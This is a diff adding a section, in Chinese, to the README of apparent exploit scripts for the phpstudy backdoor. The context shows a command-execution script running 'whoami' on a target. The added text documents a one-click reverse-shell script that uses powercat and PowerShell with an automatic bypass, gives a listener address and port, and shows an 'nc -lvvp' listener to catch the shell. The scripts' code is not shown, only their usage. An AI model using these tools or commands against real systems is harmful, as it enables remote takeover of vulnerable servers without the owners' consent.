@@ -26,3 +26,17 @@ python phpstudy_backdoor_exp.py 127.0.0.1 whoami
 rabbitmask\rabbitmask
 ```
 
+### phpstudy_backdoor_shell.py
+	脚本一键反弹shell，自动bypass，关于原理后边给教程，简单说借助了powercat、powershell等，所以请在powershell中执行`set-executionpolicy remotesigned`允许脚本执行。
+	Usage: python3 phpstudy_backdoor_exp.py [url]
+	#请配置监听地址与端口
+	listen_host='192.168.1.254'
+	listen_port='6666'
+
+##### 运行demo：
+```
+python phpstudy_backdoor_shell.py 127.0.0.1
+
+nc -lvvp [port]
+```
+
